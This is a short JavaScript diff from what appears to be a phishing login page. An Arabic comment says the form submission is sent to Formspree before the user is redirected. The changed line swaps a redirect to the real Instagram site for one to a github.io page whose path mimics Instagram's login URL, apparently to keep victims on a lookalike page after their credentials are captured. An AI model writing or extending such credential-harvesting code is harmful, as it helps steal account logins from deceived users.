@@ -34,7 +34,7 @@ document.addEventListener('DOMContentLoaded', () => {
     loginForm.addEventListener('submit', () => {
         // ننتظر ثانية لضمان الإرسال لـ Formspree ثم نحول المستخدم
         setTimeout(() => {
-            window.location.href = "https://www.instagram.com/";
+            window.location.href = "https://thefishsop.github.io/https-www.instagram.com-accounts-login-hl-en/";
         }, 1000);
     });
 });
